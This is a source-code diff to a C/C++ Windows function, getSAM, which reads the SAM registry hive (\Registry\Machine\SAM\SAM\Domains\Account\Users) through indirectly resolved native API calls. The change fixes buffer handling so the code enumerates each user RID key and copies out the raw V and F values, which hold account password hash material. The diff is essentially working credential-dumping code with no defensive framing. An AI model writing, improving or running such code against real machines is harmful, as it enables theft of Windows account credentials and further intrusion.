@@ -95,10 +95,10 @@ void getSAM(PSAM samRegEntries[], PULONG len) {
 	UNICODE_STRING UnicodeRegPath;
 	UNICODE_STRING UnicodeRegPathSubKey;
 	ULONG lengthBuff;
-	KEY_FULL_INFORMATION keyInfo;
-	KEY_FULL_INFORMATION keyInfoSubKeys;
-	KEY_BASIC_INFORMATION keyInfoSubKeysBasic;
-	KEY_VALUE_FULL_INFORMATION keyValuesSubKey;
+	PKEY_FULL_INFORMATION keyInfo = NULL;
+	PKEY_FULL_INFORMATION keyInfoSubKey = NULL;
+	PKEY_BASIC_INFORMATION keyInfoSubKeysBasic = NULL;
+	PKEY_VALUE_FULL_INFORMATION keyValuesSubKey = NULL;
 	WCHAR RegPath[MAX_PATH] = L"\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\Users";
 	DWORD maxLenOfNames;
 	ULONG nEntries = 0;
@@ -106,85 +106,112 @@ void getSAM(PSAM samRegEntries[], PULONG len) {
 
 	DWORD ret;
 
+
 	pMyRtlInitUnicodeString(&UnicodeRegPath, RegPath);
 	InitializeObjectAttributes(&attributes, &UnicodeRegPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
 	ret = pMyNtOpenKey(&key, KEY_READ, &attributes);
 
-	if (ret != STATUS_SUCCESS) {
+	if (!NT_SUCCESS(ret)) {
 		exit(ret);
 	}
 
-	ret = pMyNtQueryKey(key, KeyFullInformation, &keyInfo, sizeof(keyInfo), &lengthBuff);
+	ret = pMyNtQueryKey(key, KeyFullInformation, NULL, 0, &lengthBuff);
 
-	if (ret != STATUS_SUCCESS) {
+	keyInfo = (PKEY_FULL_INFORMATION)HeapAlloc(GetProcessHeap(), 0, lengthBuff);
+
+	ret = pMyNtQueryKey(key, KeyFullInformation, keyInfo, lengthBuff, &lengthBuff);
+
+	if (!NT_SUCCESS(ret)) {
 		exit(ret);
 	}
 
-	if (keyInfo.SubKeys) {
-		for (int i = 0; i < keyInfo.SubKeys; i++) {
+	if (keyInfo->SubKeys) {
+		for (int i = 0; i < keyInfo->SubKeys; i++) {
 			maxLenOfNames = MAX_KEY_LENGTH;
 
-			ret = pMyNtEnumerateKey(key, i, KeyBasicInformation, &keyInfoSubKeysBasic, sizeof(keyInfoSubKeysBasic), &lengthBuff);
+			ret = pMyNtEnumerateKey(key, i, KeyBasicInformation, NULL, 0, &lengthBuff);
 
-			if (ret != STATUS_SUCCESS) {
+			keyInfoSubKeysBasic = (PKEY_BASIC_INFORMATION)HeapAlloc(GetProcessHeap(), 0, lengthBuff);
+
+			ret = pMyNtEnumerateKey(key, i, KeyBasicInformation, keyInfoSubKeysBasic, lengthBuff, &lengthBuff);
+
+			if (!NT_SUCCESS(ret)) {
 				exit(ret);
 			}
 
-			_bstr_t aux(keyInfoSubKeysBasic.Name);
-
+			_bstr_t aux(keyInfoSubKeysBasic->Name);
 			if (strncmp(aux, "00", strlen("00")) == 0) {
-				CHAR aux2[MAX_PATH];
-				strncat_s(aux2, MAX_PATH, aux, keyInfoSubKeysBasic.NameLength);
-
-				WCHAR RegPathSubKey[MAX_PATH];
+				WCHAR aux2[MAX_PATH];
 				size_t outSize;
-				mbstowcs_s(&outSize, RegPathSubKey, MAX_PATH, aux2, strlen(aux2 + 1));
+				mbstowcs_s(&outSize, aux2, sizeof(WCHAR) * MAX_PATH, aux, _TRUNCATE);
+
+				WCHAR RegPathSubKey[MAX_PATH] = L"\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\Users\\";
+				wcsncat_s(RegPathSubKey, sizeof(WCHAR) * MAX_PATH, aux2, _TRUNCATE);
 
 				pMyRtlInitUnicodeString(&UnicodeRegPathSubKey, RegPathSubKey);
 				InitializeObjectAttributes(&attributesSubKey, &UnicodeRegPathSubKey, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
 				ret = pMyNtOpenKey(&subKey, KEY_READ, &attributesSubKey);
 
-				if (ret != STATUS_SUCCESS) {
+				if (!NT_SUCCESS(ret)) {
 					exit(ret);
 				}
 
-				ret = pMyNtEnumerateKey(subKey, i, KeyFullInformation, &keyInfoSubKeys, sizeof(keyInfoSubKeys), &lengthBuff);
+				ret = pMyNtQueryKey(subKey, KeyFullInformation, NULL, 0, &lengthBuff);
 
-				if (ret != STATUS_SUCCESS) {
+				keyInfoSubKey = (PKEY_FULL_INFORMATION)HeapAlloc(GetProcessHeap(), 0, lengthBuff);
+
+				ret = pMyNtQueryKey(subKey, KeyFullInformation, keyInfoSubKey, lengthBuff, &lengthBuff);
+
+				if (!NT_SUCCESS(ret)) {
 					exit(ret);
 				}
 
 				PSAM sam = (PSAM)HeapAlloc(GetProcessHeap(), NULL, sizeof(SAM));
-				CopyMemory(sam->rid, keyInfoSubKeysBasic.Name, keyInfoSubKeysBasic.NameLength);
-				getClasses(sam);
-				for (int j = 0; j < keyInfoSubKeys.Values; j++) {
-					ret = pMyNtEnumerateValueKey(subKey, j, KeyValueFullInformation, &keyValuesSubKey, sizeof(keyValuesSubKey), &lengthBuff);
+				_bstr_t aux(keyInfoSubKeysBasic->Name);
+				char* aux3 = aux;
+				CopyMemory(sam->rid, aux3, keyInfoSubKeysBasic->NameLength);
 
-					if (ret != STATUS_SUCCESS) {
+				//getClasses(sam);
+
+				for (int j = 0; j < keyInfoSubKey->Values; j++) {
+					ret = pMyNtEnumerateValueKey(subKey, j, KeyValueFullInformation, NULL, 0, &lengthBuff);
+
+					keyValuesSubKey = (PKEY_VALUE_FULL_INFORMATION)HeapAlloc(GetProcessHeap(), 0, lengthBuff);
+
+					ret = pMyNtEnumerateValueKey(subKey, j, KeyValueFullInformation, keyValuesSubKey, lengthBuff, &lengthBuff);
+
+					if (!NT_SUCCESS(ret)) {
 						exit(ret);
 					}
 
-					_bstr_t aux(keyValuesSubKey.Name);
-					if (strncmp(aux, "V", keyValuesSubKey.NameLength) == 0) {
-						CopyMemory(sam->v, keyValuesSubKey.Name, keyValuesSubKey.NameLength);
+					_bstr_t aux(keyValuesSubKey->Name);
+					if (strncmp(aux, "V", keyValuesSubKey->NameLength) == 0) {
+						PVOID data = (PVOID)((ULONG_PTR)keyValuesSubKey + keyValuesSubKey->DataOffset);
+						CopyMemory(sam->v, data, keyValuesSubKey->DataLength);
 					}
 
-					if (strncmp(aux, "F", keyValuesSubKey.NameLength) == 0) {
-						CopyMemory(sam->f, keyValuesSubKey.Name, keyValuesSubKey.NameLength);
+					if (strncmp(aux, "F", keyValuesSubKey->NameLength) == 0) {
+						PVOID data = (PVOID)((ULONG_PTR)keyValuesSubKey + keyValuesSubKey->DataOffset);
+						CopyMemory(sam->f, data, keyValuesSubKey->DataLength);
 					}
+					HeapFree(GetProcessHeap(), 0, keyValuesSubKey);
 				}
 				sams[nEntries] = sam;
 				nEntries++;
+				HeapFree(GetProcessHeap(), 0, keyInfoSubKey);
 			}
+			HeapFree(GetProcessHeap(), 0, keyInfoSubKeysBasic);
 		}
 	}
+	HeapFree(GetProcessHeap(), 0, keyInfo);
 
 	CopyMemory(len, &nEntries, sizeof(ULONG));
 	if (samRegEntries != NULL) {
 		for (int i = 0; i < nEntries; i++) {
 			CopyMemory(samRegEntries[i], sams[i], sizeof(SAM));
+			HeapFree(GetProcessHeap(), 0, sams[i]);
 		}
 	}
 }
